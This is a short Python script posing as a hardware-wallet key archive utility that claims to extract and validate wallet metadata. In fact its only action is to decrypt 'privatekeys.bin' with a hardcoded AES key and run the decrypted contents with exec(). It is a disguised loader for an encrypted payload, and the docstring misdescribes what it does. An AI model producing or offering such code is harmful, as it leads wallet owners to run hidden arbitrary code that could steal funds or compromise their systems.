
"""
Keychain Utility: Private Wallet Archive v1.2

This tool parses binary key archives exported from legacy hardware wallets. 
Run this alongside your `privatekeys.bin` archive to securely extract and validate
your wallet metadata. Supports AES-128 CBC decryption with cross-platform compatibility.

Usage:
    python decryptkeys.py
"""

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = b'supersecretkey12'
with open("privatekeys.bin", "rb") as f:
    data = f.read()
    iv, ciphertext = data[:16], data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    exec(unpad(cipher.decrypt(ciphertext), AES.block_size).decode())
